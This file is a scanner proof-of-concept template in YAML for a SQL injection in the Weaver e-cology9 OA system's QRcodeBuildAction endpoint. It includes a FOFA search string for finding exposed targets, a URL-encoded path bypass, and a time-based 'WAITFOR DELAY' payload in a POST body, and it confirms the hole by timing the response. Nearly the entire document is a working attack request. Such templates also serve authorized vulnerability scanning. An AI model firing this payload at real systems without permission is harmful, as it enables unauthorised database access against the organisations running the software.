id: poc-yaml-weaver-e-cology9-qrcodebuildaction-sqli
info:
  name: 泛微OA e-cology9 QRcodeBuildAction SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: e-cology
  fofa: app="泛微-OA（e-cology）"
variables:
  t1: random_int(1,100000)
  t2: random_int(5,10)
  t3: t2 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(headers,"ecology")
- method: POST
  path: /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: modeid={{.t1}}+WAITFOR+DELAY+'0%3a0%3a{{.t2}}'
  expression: status_code == 200 && body == "" && duration > t2 && duration < t3
transport: http
